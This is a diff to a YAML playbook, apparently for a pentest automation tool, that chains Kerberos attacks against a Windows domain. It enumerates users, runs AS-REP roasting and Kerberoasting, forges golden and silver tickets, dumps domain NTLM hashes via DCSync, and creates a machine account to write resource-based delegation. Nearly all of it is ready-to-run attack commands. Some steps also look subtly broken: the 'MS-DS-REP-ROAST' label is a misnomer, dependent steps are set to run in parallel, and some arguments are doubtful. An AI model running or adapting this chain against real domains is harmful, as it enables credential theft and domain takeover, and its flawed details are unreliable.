@@ -1,6 +1,6 @@
 name: "Kerberos Attacks"
 description: "Kerberos attack techniques: Kerberoasting, AS-REP roasting, delegation abuse (unconstrained/constrained/resource-based), golden/silver tickets, and MS-DS-REP-ROAST"
-version: "1.0"
+version: "2.0"
 
 vars:
   domain: ""
@@ -8,6 +8,9 @@ vars:
   username: ""
   password: ""
   hash: ""
+  domain_sid: ""
+  base_dn: ""
+  username_wordlist: "/wordlists/Generic_Fuzz.txt"
 
 preflight:
   - id: setup
@@ -25,18 +28,17 @@ steps:
         name: "Kerbrute user enumeration"
         tool: kerbrute
         args: ["userenum", "-d", "{domain}", "--dc", "{dc_ip}",
-               "/wordlists/kerberos_usernames.txt",
-               "-o", "{case_dir}/kerbrute_users.txt"]
+               "{username_wordlist}"]
         timeout: 300
-        artifacts: ["{case_dir}/kerbrute_users.txt"]
+        save: "{case_dir}/kerbrute_users.txt"
 
       - id: ldap_users
         name: "LDAP user listing"
         tool: ldapsearch
         args: ["-x", "-H", "ldap://{dc_ip}",
-               "-b", "DC={domain.replace('.',',DC=')}",
-               "-o", "{case_dir}/ldap_users.txt"]
+               "-b", "{base_dn}"]
         timeout: 60
+        save: "{case_dir}/ldap_users.txt"
 
   # ---- Phase 2: AS-REP roasting ----
   - id: asrep_roast
@@ -47,18 +49,17 @@ steps:
         name: "Impacket GetNPUsers"
         tool: impacket-GetNPUsers
         args: ["-dc-ip", "{dc_ip}", "-request", "-format", "hashcat",
-               "{domain}/",
-               "-o", "{case_dir}/asrep_hashes.txt"]
+               "{domain}/"]
         timeout: 120
-        artifacts: ["{case_dir}/asrep_hashes.txt"]
+        save: "{case_dir}/asrep_hashes.txt"
 
       - id: getnp_users_user
         name: "GetNPUsers with creds"
         tool: impacket-GetNPUsers
         args: ["-dc-ip", "{dc_ip}", "-request", "-format", "hashcat",
-               "{domain}/{username}:{password}",
-               "-o", "{case_dir}/asrep_hashes_auth.txt"]
+               "{domain}/{username}:{password}"]
         timeout: 120
+        save: "{case_dir}/asrep_hashes_auth.txt"
 
   # ---- Phase 3: Kerberoasting ----
   - id: kerberoast
@@ -69,10 +70,9 @@ steps:
         name: "Impacket GetUserSPNs"
         tool: impacket-GetUserSPNs
         args: ["-dc-ip", "{dc_ip}", "-request", "-format", "hashcat",
-               "{domain}/{username}:{password}",
-               "-o", "{case_dir}/kerberoast_hashes.txt"]
+               "{domain}/{username}:{password}"]
         timeout: 300
-        artifacts: ["{case_dir}/kerberoast_hashes.txt"]
+        save: "{case_dir}/kerberoast_hashes.txt"
 
   # ---- Phase 4: Delegation enumeration ----
   - id: delegation_enum
@@ -84,20 +84,19 @@ steps:
         name: "Find unconstrained/constrained delegation"
         tool: impacket-findDelegation
         args: ["-dc-ip", "{dc_ip}",
-               "{domain}/{username}:{password}",
-               "-o", "{case_dir}/delegation_found.txt"]
+               "{domain}/{username}:{password}"]
         timeout: 60
-        artifacts: ["{case_dir}/delegation_found.txt"]
+        save: "{case_dir}/delegation_found.txt"
 
       - id: rbcd_check
         name: "Resource-based constrained delegation"
         tool: impacket-rbcd
         args: ["-delegate-from", "{username}@{domain}",
-               "-delegate-to", "DC${domain}@{domain}".replace(".",""),
+               "-delegate-to", "DC${domain}",
                "-dc-ip", "{dc_ip}",
-               "-action", "read",
-               "-o", "{case_dir}/rbcd_check.txt"]
+               "-action", "read"]
         timeout: 60
+        save: "{case_dir}/rbcd_check.txt"
 
   # ---- Phase 5: Golden/Silver ticket ----
   - id: ticket_forge
@@ -112,28 +111,27 @@ steps:
         tool: impacket-ticketer
         args: ["-dc-ip", "{dc_ip}",
                "-nthash", "{hash}",
-               "-domain-sid", "<DOMAIN_SID>",
+               "-domain-sid", "{domain_sid}",
                "-domain", "{domain}",
                "-user-id", "500",
                "-groups", "512,513,518,519,520",
-               "Administrator",
-               "-o", "{case_dir}/golden_ticket.ccache"]
+               "-request", "Administrator"]
         timeout: 60
-        artifacts: ["{case_dir}/golden_ticket.ccache"]
+        save: "{case_dir}/golden_ticket.ccache"
 
       - id: silver_ticket
         name: "Silver ticket (service-specific)"
         tool: impacket-ticketer
         args: ["-dc-ip", "{dc_ip}",
                "-nthash", "{hash}",
-               "-domain-sid", "<DOMAIN_SID>",
+               "-domain-sid", "{domain_sid}",
                "-domain", "{domain}",
                "-user-id", "500",
                "-groups", "512,513,518,519,520",
                "-spn", "cifs/{target}",
-               "Administrator",
-               "-o", "{case_dir}/silver_ticket.ccache"]
+               "-request", "Administrator"]
         timeout: 60
+        save: "{case_dir}/silver_ticket.ccache"
 
   # ---- Phase 6: DCSync ----
   - id: dcsync_attack
@@ -148,21 +146,77 @@ steps:
         tool: impacket-secretsdump
         args: ["-dc-ip", "{dc_ip}",
                "-just-dc-ntlm",
-               "{domain}/{username}@{target}",
-               "-o", "{case_dir}/dcsync_hashes.txt"]
+               "-hashes", "{hash}",
+               "{domain}/{username}@{target}"]
         timeout: 300
-        artifacts: ["{case_dir}/dcsync_hashes.txt"]
+        save: "{case_dir}/dcsync_hashes.txt"
 
-  # ---- Phase 7: Report ----
+  # ---- Phase 7: MS-DS-REP-ROAST ----
+  - id: msds_rep_roast
+    name: "MS-DS-REP-ROAST (MachineAccountQuota abuse)"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: check_quota
+        name: "Check ms-DS-MachineAccountQuota"
+        tool: ldapsearch
+        args: ["-x", "-H", "ldap://{dc_ip}",
+               "-D", "{username}@{domain}", "-w", "{password}",
+               "-b", "{base_dn}",
+               "(objectClass=domain)", "ms-DS-MachineAccountQuota"]
+        timeout: 30
+        save: "{case_dir}/machine_quota.txt"
+
+      - id: create_machine
+        name: "Create machine account via impacket"
+        tool: impacket-addcomputer
+        args: ["-dc-ip", "{dc_ip}",
+               "-computer-name", "ROASTED$",
+               "-computer-pass", "RoastedPass123!",
+               "{domain}/{username}:{password}"]
+        timeout: 60
+        save: "{case_dir}/machine_account_create.txt"
+
+      - id: rbcd_abuse
+        name: "RBCD abuse with created machine"
+        tool: impacket-rbcd
+        args: ["-delegate-from", "ROASTED${domain}",
+               "-delegate-to", "DC${domain}",
+               "-dc-ip", "{dc_ip}",
+               "-action", "write"]
+        timeout: 60
+        save: "{case_dir}/rbcd_abuse.txt"
+
+  # ---- Phase 8: Report ----
   - id: report
-    name: "Kerberos attack note"
+    name: "Kerberos attack report"
+    type: report
+    format: markdown
+    title: "Kerberos Attack Report — {domain}"
+    output: "{case_dir}/kerberos-report.md"
+    sections:
+      - heading: "Target"
+        body: "- Domain: {domain}\n- DC: {dc_ip}"
+      - heading: "User Enumeration"
+        body: "- Kerbrute users: {case_dir}/kerbrute_users.txt\n- LDAP users: {case_dir}/ldap_users.txt"
+      - heading: "AS-REP Roasting"
+        body: "- Unauthenticated hashes: {case_dir}/asrep_hashes.txt (hashcat -m 18200)\n- Authenticated hashes: {case_dir}/asrep_hashes_auth.txt (hashcat -m 18200)"
+      - heading: "Kerberoasting"
+        body: "- Service hashes: {case_dir}/kerberoast_hashes.txt (hashcat -m 13100)"
+      - heading: "Delegation Enumeration"
+        body: "- Delegation found: {case_dir}/delegation_found.txt\n- RBCD check: {case_dir}/rbcd_check.txt"
+      - heading: "Ticket Forging"
+        body: "- Golden ticket: {case_dir}/golden_ticket.ccache\n- Silver ticket: {case_dir}/silver_ticket.ccache"
+      - heading: "DCSync"
+        body: "- NTLM hashes: {case_dir}/dcsync_hashes.txt"
+      - heading: "MS-DS-REP-ROAST"
+        body: "- Machine quota: {case_dir}/machine_quota.txt\n- Machine account: {case_dir}/machine_account_create.txt\n- RBCD abuse: {case_dir}/rbcd_abuse.txt"
+
+postflight:
+  - id: cleanup
     type: log
-    message: |
-      Kerberos attack chain complete for domain {domain}.
-      Results in {case_dir}/:
-      - AS-REP hashes: asrep_hashes.txt (crack with hashcat -m 18200)
-      - Kerberoast hashes: kerberoast_hashes.txt (crack with hashcat -m 13100)
-      - Delegation: delegation_found.txt, rbcd_check.txt
-      - Tickets: golden_ticket.ccache, silver_ticket.ccache
-      - DCSync: dcsync_hashes.txt
-      Use 'cc case {case_id} task add' to track cracking progress.
+    message: "Kerberos attack chain complete — {case_dir}"
+  - id: notify_done
+    type: notify
+    level: success
+    message: "Kerberos attack chain finished for domain {domain}. Results in {case_dir}"
